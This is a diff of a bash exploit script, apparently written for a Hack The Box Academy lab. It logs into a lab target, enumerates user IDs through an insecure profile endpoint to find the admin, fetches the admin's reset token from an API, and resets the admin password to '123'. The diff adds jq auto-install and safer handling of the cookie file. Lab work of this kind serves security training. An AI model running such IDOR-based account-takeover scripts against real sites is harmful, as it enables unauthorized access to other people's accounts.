@@ -1,12 +1,35 @@
 #!/bin/bash
 
+# Check and install jq if not available
+if ! command -v jq &> /dev/null; then
+    echo "[*] jq not found - attempting to install..."
+    if [[ -f /etc/debian_version ]]; then
+        sudo apt update && sudo apt install -y jq
+    elif [[ -f /etc/redhat-release ]]; then
+        sudo yum install -y jq
+    elif [[ "$OSTYPE" == "darwin"* ]]; then
+        brew install jq
+    else
+        echo "[-] Could not automatically install jq - please install manually"
+        exit 1
+    fi
+    
+    # Verify installation
+    if ! command -v jq &> /dev/null; then
+        echo "[-] jq installation failed - please install manually"
+        exit 1
+    fi
+    echo "[+] jq successfully installed"
+fi
+
 # Target configuration
 TARGET="http://94.237.55.43:50149"
 LOGIN_URL="$TARGET/index.php"
 CREDS="username=htb-student&password=Academy_student%21"
 
-# Static credentials
-COOKIE_FILE="/tmp/cookies.txt"
+# Cookie management
+COOKIE_FILE=$(mktemp)
+trap 'rm -f "$COOKIE_FILE"' EXIT
 
 echo "[*] Authenticating with static credentials..."
 # Perform login and save cookies
@@ -15,10 +38,10 @@ curl -s -v -X POST "$LOGIN_URL" \
   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0" \
   -H "Referer: $TARGET/" \
   -d "$CREDS" \
-  -c $COOKIE_FILE -b $COOKIE_FILE > /dev/null 2>&1
+  -c "$COOKIE_FILE" -b "$COOKIE_FILE" > /dev/null 2>&1
 
-# Check if login succeeded by looking for PHPSESSID
-if [ ! -s $COOKIE_FILE ] || ! grep -q "PHPSESSID" $COOKIE_FILE; then
+# Check if login succeeded
+if [ ! -s "$COOKIE_FILE" ] || ! grep -q "PHPSESSID" "$COOKIE_FILE"; then
   echo "[-] Authentication failed!"
   exit 1
 fi
@@ -30,7 +53,7 @@ echo "[*] Scanning users 1-100 for admin..."
 ADMIN_UID=""
 
 for id in {1..100}; do
-  username=$(curl -s -b $COOKIE_FILE "$TARGET/profile.php?uid=$id" | grep -oP "username: \K.*")
+  username=$(curl -s -b "$COOKIE_FILE" "$TARGET/profile.php?uid=$id" | grep -oP "username: \K.*")
   
   if [[ -n "$username" ]]; then
     echo "[+] Found UID $id: $username"
@@ -51,7 +74,7 @@ fi
 
 # Part 2: Get token for admin using authenticated session
 echo "[*] Getting token for admin (UID $ADMIN_UID)..."
-ADMIN_TOKEN=$(curl -s -b $COOKIE_FILE "$TARGET/api.php/token/$ADMIN_UID" | jq -r '.token')
+ADMIN_TOKEN=$(curl -s -b "$COOKIE_FILE" "$TARGET/api.php/token/$ADMIN_UID" | jq -r '.token')
 
 if [[ -z "$ADMIN_TOKEN" ]]; then
   echo "[-] Failed to get admin token"
@@ -62,18 +85,15 @@ echo "[+] Admin Token: $ADMIN_TOKEN"
 
 # Part 3: Reset admin password using authenticated session
 echo "[*] Resetting admin password to '123'..."
-reset_response=$(curl -s -v -b $COOKIE_FILE \
+reset_response=$(curl -s -v -b "$COOKIE_FILE" \
   "$TARGET/reset.php?uid=$ADMIN_UID&token=$ADMIN_TOKEN&password=123" 2>&1)
 
-if echo "$reset_response" | grep -q "Password reset successful"; then
+if echo "$reset_response" | grep -qi "success"; then
   echo "[+] PASSWORD RESET SUCCESSFUL"
   echo "    Admin UID: $ADMIN_UID"
   echo "    New password: 123"
 else
-  echo "[-] Password reset failed"
-  echo "    Response:"
+  echo "[-] Password reset may have failed"
+  echo "    Server response:"
   echo "$reset_response" | head -n 20
 fi
-
-# Clean up
-rm -f $COOKIE_FILE
